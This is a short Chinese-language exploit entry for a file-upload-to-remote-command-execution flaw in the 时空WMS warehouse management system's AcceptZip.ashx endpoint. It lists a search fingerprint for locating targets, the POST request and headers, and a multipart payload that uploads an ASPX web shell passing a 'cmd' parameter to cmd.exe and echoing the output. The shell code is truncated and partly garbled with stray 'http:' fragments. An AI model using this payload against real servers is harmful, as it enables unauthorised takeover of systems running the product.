# 时空WMS-仓储精细化管理系统AcceptZip.ashx文件上传致RCE漏洞

- **系统**：时空WMS-仓储精细化管理系统AcceptZip.ashx文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="SKControlKLForJson.ashx"`
- **请求**：`POST /AcceptZip.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPp…`

**请求体 / payload**
```
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: text/plain
<%@ Page Language="Jｓｃｒｉｐｔ" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:http://System.IO.StreamReader,EI:http://System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());http:/…（脚本共 733 字，完整版见原文）
```
- **预期**：200　|　—